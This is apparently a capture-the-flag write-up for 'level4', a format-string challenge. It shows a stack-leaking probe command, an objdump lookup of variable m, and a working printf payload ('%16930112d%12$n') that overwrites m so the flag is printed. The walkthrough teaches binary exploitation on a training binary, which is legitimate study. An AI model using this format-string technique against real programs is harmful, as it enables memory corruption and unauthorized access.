# level4
The code looks like the previous level. But there are three differences:
- `printf` is called through a function `p` instead of beeing called directly
- The global variable `m` is compared to `0x1025544` instead of `0x40`
- the if statement cat directly the flag instead of run a shell

## Goal

Same goal : write `0x1025544` to `m` and get the flag

> 0x1025544 = 16930116 in decimal

But this time, we can't write 16930116 characters into the buffer because it is protected from overflow by `fgets` (here `fgets()` reads 512 chars max).

## Step 1
find with which parameter `printf` fall on the `fgets` return address (the buffer address)    
```bash
$ (python -c 'print "AAAA " + "%x " * 16'; cat)  | /home/user/level4/level4
```
```console
AAAA b7ff26b0 bffff754 b7fd0ff4 0 0 bffff718 804848d bffff510 200 b7fd1ac0 b7ff37d0 41414141 25207825 78252078
```

the Buffer "is" the 13th parameter of `printf` (the 12th va_arg) 

## Step 2
Find the address of the `m` variable
```bash
$ objdump -t level4
```
```console
08049810 g     O .bss	00000004              m
```

## Exploit

```bash
(python -c 'print "\x10\x98\x04\x08" + "%16930112d%12$n"'; cat)  | /home/user/level4/level4
```

- %12$n: refer to the 12th argument in the argument list of printf (the buffer)
- %16930112d: format the output and print 16930112 characters on stdout to display the 1st argument of the list  (decimal format)
    > 16930112 = 16930116 - 4 (4 bytes for the address of `m` ever written)
- \x10\x98\x04\x08: the address of `m` variable

Finally, it write 16930116